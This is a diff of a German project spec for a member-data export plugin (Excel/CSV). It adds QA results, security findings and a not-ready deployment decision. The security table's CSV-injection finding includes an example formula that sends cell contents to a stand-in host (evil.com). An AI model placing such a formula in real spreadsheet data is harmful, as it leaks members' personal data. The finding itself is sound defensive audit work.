@@ -1,8 +1,8 @@
 # PROJ-60: Datenweiterleitung an externe Systeme — Plugin-Framework
 
-## Status: In Progress
+## Status: In Review
 **Created:** 2026-05-23
-**Last Updated:** 2026-05-23 (`/frontend` Phase 1 abgeschlossen — Admin-UI für Excel-Plugin komplett)
+**Last Updated:** 2026-05-23 (`/qa` durchlaufen — 20 Unit-Tests + Security-Smoke; 1 Medium + 3 Low Findings → siehe QA Test Results)
 **Quelle:** Owner-Anforderung
 
 ## Dependencies
@@ -870,8 +870,133 @@ Der `data-export-cleanup`-Subcommand erledigt sequenziell:
 
 Reihenfolge der Tasks ist irrelevant (alle idempotent). Bei Cron-Run-Dauer >10 Min verhindert `concurrencyPolicy: Forbid` Doppelläufe.
 
-## QA Test Results
-_To be added by /qa_
+## QA Test Results (2026-05-23)
+
+### Automated Tests
+
+| Suite | Result |
+|---|---|
+| `go vet ./...` | ✓ pass |
+| `go test ./...` | ✓ pass (alle bestehenden + 20 neue Excel-Plugin-Tests) |
+| `helm lint helm/member-onboarding/` | ✓ pass (1 INFO „icon recommended" — vorbestanden) |
+| `npm run build` | ✓ pass (Next.js 16.2.6, TS clean) |
+| `govulncheck` | 6 stdlib-Findings — **alle vorbestanden** (Go 1.26.2 → 1.26.3 nötig, separates PROJ) |
+| `npm audit --audit-level=high` | 4 moderates — **alle vorbestanden** (postcss/next/uuid-Chain, separates PROJ) |
+| `npm test` (Vitest) | ⚠ lokal blockiert durch Windows-Native-Binding-Issue (rolldown) — kein Code-Problem, CI prüft |
+
+### Unit-Tests neu (Go)
+
+20 Tests in `internal/dataexport/excel/plugin_test.go`:
+- `ValidateConfig` — 8 Tests (Happy + 7 Reject-Cases inkl. duplicate header, unknown field, invalid format, too-many-columns)
+- `formatValue` — 6 Tests pro Datentyp (date, bool, enum, number, multi, nil)
+- `renderCSV` / `renderXLSX` — 3 Tests (BOM + Struktur, ZIP-Magic, Progress-Callback)
+- `Plugin.Process` — 2 Tests (csv + xlsx End-to-End)
+- `StandardConfigs` — 1 Test (alle 3 Vorlagen müssen `ValidateConfig` bestehen)
+
+### Manuelle Tests (offen)
+
+Local-Dev-Server nicht gestartet — folgende manuelle End-to-End-Flüsse müssen
+vor `/deploy` durchgespielt werden:
+
+- [ ] EEG-Admin legt Konfig aus „Newsletter"-Vorlage an, sieht Live-Preview
+- [ ] Bulk-Action aus Antragsliste → Trigger-Dialog zeigt Konfig → Polling-Modal → Download
+- [ ] Single-Action aus Antrags-Detail → Datei kommt
+- [ ] Cross-EEG-Selektion in Bulk → Button ist disabled mit Tooltip
+- [ ] BackOffice Failed-Badge erscheint nach simuliertem Failure
+- [ ] Status-Filter + „Mehr laden"-Pagination im BackOffice
+- [ ] Excel-Datei in Excel öffnen, alle Spalten + Format-Transformationen prüfen
+- [ ] CSV-Datei in Excel öffnen, Umlaute korrekt (UTF-8 BOM), Semikolon erkannt
+- [ ] Responsive (375/768/1440 px) im Editor, Tabelle + Modal
+- [ ] Cross-Browser Chrome/Firefox/Safari für Trigger + Polling
+
+### Security Smoke-Test
+
+Geprüft alle neuen Dateien (`internal/dataexport/**`, `internal/http/dataexport.go`,
+`helm/member-onboarding/templates/data-export-cleanup-cronjob.yaml`,
+`db/migrations/000052_data_export.up.sql`, FE-Komponenten).
+
+| Severity | Datei | Funktion | Risiko | Exploit-Szenario | Fix-Empfehlung | Confidence |
+|---|---|---|---|---|---|---|
+| **Medium** | `internal/dataexport/excel/renderer.go` | `extractAndFormat` / `renderCSV` / `renderXLSX` | **CSV/Excel-Injection** — User-Eingaben wie Vor-/Nachname werden 1:1 in Zellen geschrieben | Mitglied trägt bei `firstname` z.B. `=HYPERLINK("http://evil.com/?"&A2,"klick")` ein. Admin öffnet Excel-Export, klickt — Daten leaken oder Skript läuft. | Werte, die mit `=`, `+`, `-`, `@`, Tab oder CR beginnen, mit `'` (Apostroph) prefixen, oder Werte in XLSX-Zellen mit Type `String` setzen | High |
+| **Low** | `internal/dataexport/excel/plugin.go:117-128` | `Process` | **Filename-Spec-Abweichung** — Spec verlangt `{rc_number}-{config_name}-{YYYY-MM-DD}.{xlsx\|csv}`, Code liefert `export-{count}.{xlsx\|csv}` | Admin lädt mehrere Exports unterschiedlicher Konfigs herunter, alle heißen ähnlich — Verwechslungsgefahr; keine Security-Implikation | Filename-Schema gemäß Spec implementieren; rcNumber/config-Name müssen sanitised werden (kein Path-Traversal-Risiko, aber Sonderzeichen aus Konfig-Name escapen) | High |
+| **Low** | `internal/dataexport/worker.go:130-191` | `fail()` über `MarkFailed` | **Error-Message-Leak** — Wrapping mit `%v` kann DB-/Pkg-interne Details in das `error_message`-Feld kopieren, das im UI an den Admin gezeigt wird | DB-Connection-Fehler („pq: connection refused at host xyz") landet in der Job-Liste | Errors sanitisieren (z.B. „Datenbank-Fehler bei Job-Verarbeitung") und Details nur in `slog.Error` | Medium |
+| **Low** | `internal/dataexport/excel/fields.go` | `iban`, `birth_date` als Felder verfügbar | **DSGVO-Sensitivität** — IBAN und Geburtsdatum sind exportierbar; Frontend zeigt Warnung, aber Backend hat keine zusätzliche Audit-Spur | Admin exportiert IBAN-Liste in unsicheres CRM | Optional: zusätzliches Audit-Log-Event mit Klassifikation „sensitive-export" für Compliance | Medium |
+| **Info** | `internal/dataexport/loader.go:59-87` | `LoadRecentImportedForPreview` | **Spec-Abweichung** — Methodenname und Spec sagen „letzte 5 importierten Mitglieder", Implementierung lädt aber **alle** recent applications regardless of status | Im Editor sieht Admin auch Draft-Anträge in der Preview; nicht falsch, aber irreführend | Filter `status IN ('imported','activated','ready_for_activation','awaiting_bank_confirmation')` ergänzen ODER Methode + Spec umbenennen | High |
+| **Info** | `db/migrations/000052_data_export.up.sql` | `data_export_result.file_bytes BYTEA` | **DB-Größenwachstum** bei vielen großen Exports — TTL räumt auf, aber TOAST-Tabellen können temporär groß werden | EEG mit 1.000 Mitgliedern × 50 Spalten × 10 Exports/Tag = ~50 MB/Tag bis Cleanup | Monitoring auf `pg_total_relation_size('member_onboarding.data_export_result')`. Optional: zukünftige Migration zu Object-Storage (S3) bei sustained > 1 GB | Low |
+| **Info** | govulncheck Stdlib-Findings | `net`, `net/http` | Go 1.26.2 → 1.26.3 Patches noch nicht eingespielt (GO-2026-4971, GO-2026-4918) | DoS via crafted SETTINGS_MAX_FRAME_SIZE über HTTP/2 (`coreclient`, `turnstile`) | Go-Image im Dockerfile auf 1.26.3+ bumpen — **vorbestanden, kein PROJ-60-Defect** | High |
+| **Info** | `npm audit` | `next` / `next-auth` / `uuid` Chain | 4 moderates, vorbestanden | next-auth 4.x → 5.x als breaking change | Separates PROJ für Dependency-Upgrade — **kein PROJ-60-Defect** | High |
+
+**Tenant-Isolation**: alle CRUD-Pfade prüfen `parseRCAndCheck` (JWT-Tenant-Claim
+gegen Query-Param) + Service-Layer macht erneut `cfg.RCNumber == rcNumber`-
+Vergleich → Defence-in-Depth ✓. `AppLoader.LoadForExport` filtert
+zusätzlich Apps, deren `RCNumber` nicht zur Job-RC passt → Schutz selbst
+wenn Job-Snapshot kompromittiert wäre.
+
+**SQL-Injection**: alle Queries in `repo.go` benutzen `$N`-Parameter-Binding;
+dynamisches Query-Building in `ListByRCNumber` nutzt `fmt.Sprintf` nur für
+die Argument-Position (`$2`, `$3`), nie für Werte ✓.
+
+**Auth**: Routes registriert unter `r.Route("/api/admin", ...)` mit
+`KeycloakAuthMiddleware` ✓ — der gleiche Block schützt alle anderen Admin-
+Endpoints.
+
+**File-Download**: `Content-Disposition` mit Filename aus DB (Worker hat
+Filename gesetzt, kein User-Input), MIME-Type fest aus Plugin → kein
+Path-Traversal-Risiko ✓.
+
+**Concurrency-Limit (Soft)**: Race-Condition zwischen Check und Insert kann
+zu 4-5 Jobs statt 3 führen — bewusst akzeptiert (Decision #15 in /grill-me #2).
+
+### Acceptance-Criteria-Coverage
+
+| Block | Acceptance Criteria | Status |
+|---|---|---|
+| Framework-Komponenten | DB-Migration, Plugin-Registry, 20-Configs-Limit, Name-Eindeutigkeit, 3-Jobs-Soft-Limit | ✓ Backend + verifiziert per Test |
+| Job-Queue + Worker | Snapshot, In-App-Worker, FOR UPDATE SKIP LOCKED, Status-Transitions, BLOB-Persist | ✓ Backend (Worker-Lifecycle wird in `/deploy` operativ verifiziert) |
+| Job-Recovery | K8s-CronJob `data-export-cleanup`, Zombie + BLOB + Config-Hard-Delete | ✓ Helm-Template + Backend-Subcommand vorhanden |
+| Concurrency + Idempotenz | Soft-Check + FIFO, keine Auto-Dedup | ✓ |
+| Admin-UI: Configs-Verwaltung | Sektion in Settings, Liste gruppiert, Editor mit Vorlagen, Obsolete-Behandlung, Delete | ✓ Frontend implementiert |
+| Trigger: Bulk-Action | Aktion in Antragsliste, einstufige Liste, Polling, max 1.000 Anträge | ✓ Frontend + Cross-EEG-Schutz (zusätzlich) |
+| Trigger: Single-Action | Aktion in Detail, jeden Status | ✓ Frontend |
+| UI-Polling + Notification | Modal mit Live-Status, 2s/5s-Interval, Download bei Done, Retry bei Failed | ✓ Frontend |
+| Failure-Mail | Mail an triggernden Admin | ⚠ NoopFailureMailer im main.go — Hardening-TODO vor Deploy |
+| BackOffice-Übersicht | Liste, Failed-Badge (7 Tage), Filter, Cursor-Pagination, Retry/Download | ✓ Frontend |
+| DSGVO | Sensitiv-Daten-Popover bei IBAN/Geburtsdatum (FE), Cross-Tenant-Schutz, 24h-TTL, Audit-Trail | ✓ — Backend-Audit-Log-Event für Sensitive-Export als Low-Finding offen |
+| Excel-Plugin: Konfiguration | Format, Spalten 1-50, Header-Eindeutigkeit, Field-Catalog mit Kategorien | ✓ Backend + FE |
+| Excel-Plugin: Standard-Vorlagen | Newsletter, CRM-Stammdaten, Buchhaltung | ✓ Backend exposed via `/plugins`, FE rendert Dropdown |
+| Excel-Plugin: Spalten-Mapping | Header frei, Feld-Auswahl, Format pro Typ, Sortierung Auf/Ab | ✓ FE Editor |
+| Excel-Plugin: Live-Preview | Letzte 5 importierten Mitglieder, aktualisiert bei jeder Änderung | ⚠ Spec-Abweichung (Info-Finding) — lädt alle Status statt nur imported |
+| Excel-Plugin: Wert-Transformationen | Text, Datum (3 Formate), Bool (4), Enum (2), Number (2), Multi (1) | ✓ alle in `formatValue` + unit-getested |
+| Excel-Plugin: Datei-Generierung | XLSX via excelize, CSV UTF-8 BOM + Semikolon | ✓ + Test |
+| Excel-Plugin: Filename-Schema | `{rc_number}-{config_name}-{YYYY-MM-DD}.{xlsx\|csv}` | ❌ Low-Finding — aktuell `export-{count}.{ext}` |
+| Excel-Plugin: Zählpunkte | Anzahl + Liste komma-getrennt | ✓ |
+
+### Edge Cases — Status
+
+Alle Spec-Edge-Cases sind im Backend-Code geprüft (Config gelöscht während
+Job läuft → Snapshot bleibt; Mitglied gelöscht zwischen Selektion und Pickup
+→ AppLoader überspringt; Plugin entfernt → `is_obsolete=true` + Trigger-
+Dialog filtert raus). Manuelle End-to-End-Verifizierung der Edge-Cases steht
+für die Pre-Deploy-Smoke-Tests aus.
+
+### Production-Ready Entscheidung
+
+**NOT READY** für Deploy ohne Owner-Entscheidung über folgende Punkte:
+
+1. **CSV-Injection (Medium)** — Fix nötig oder bewusste Risiko-Akzeptanz (Datenempfänger ist EEG-Admin selbst, vertrauenswürdig, exportiert i.d.R. an interne Systeme; aber DSGVO-Sensitivität spricht für Fix)
+2. **Filename-Schema (Low Spec-Abweichung)** — Fix oder Spec ändern
+3. **Error-Message-Sanitisierung (Low)** — vor Deploy fixen oder als Tech-Debt führen
+4. **Preview-Status-Filter (Info Spec-Abweichung)** — Fix oder Spec präzisieren
+5. **FailureMailer (Spec-Punkt)** — vor Deploy auf Live-Mailer umziehen, sonst kein Admin-Notification bei Fail
+6. **Manuelle End-to-End-Tests** — vor Deploy in Test-Cluster durchspielen (Liste oben)
+
+Sobald (1) bis (5) entschieden + (6) durchgespielt, kann auf **Approved** wechseln.
+
+### Empfohlene Folgeschritte
+
+- `/security-review` für (1) (CSV-Injection ist sicherheitsrelevant, betrifft DSGVO-sensitive Daten); zusätzlich Tenant-Isolation + BLOB-Auth tieferprüfen
+- Owner-Entscheidung zu (2)–(5)
+- Manuelle Smoke-Tests in lokalem Dev oder Test-Cluster vor `/deploy`
 
 ## Deployment
 _To be added by /deploy_
